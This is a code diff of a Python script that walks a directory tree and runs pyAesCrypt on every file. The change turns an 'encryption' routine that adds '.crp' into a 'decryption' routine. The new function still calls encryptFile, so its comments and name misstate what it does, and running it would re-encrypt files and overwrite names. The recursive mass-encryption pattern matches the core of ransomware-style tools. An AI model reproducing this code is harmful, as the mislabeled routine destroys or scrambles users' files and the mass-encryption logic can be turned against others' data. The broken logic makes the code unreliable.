@@ -2,14 +2,14 @@ import pyAesCrypt
 import os
 
 
-# File encryption func
-def encryption(file, password):
+# File decryption func
+def decryption(file, password):
     # buffer size setting
     buffer_size = 512 * 1024
-    # call encrypt method
+    # call decrypt method
     pyAesCrypt.encryptFile(
         str(file),
-        str(file) + '.crp',
+        str(os.path.splitext(file)[0]),
         password,
         buffer_size,
     )
@@ -27,10 +27,10 @@ def walking_by_dirs(dir, password):
     for name in os.listdir(dir):
         path = os.path.join(dir, name)
 
-        # if we've found file then encrypt it
+        # if we've found file then decrypt it
         if os.path.isfile(path):
             try:
-                encryption(path, password)
+                decryption(path, password)
             except Exception as ex:
                 print(ex)
         # else continue searching files
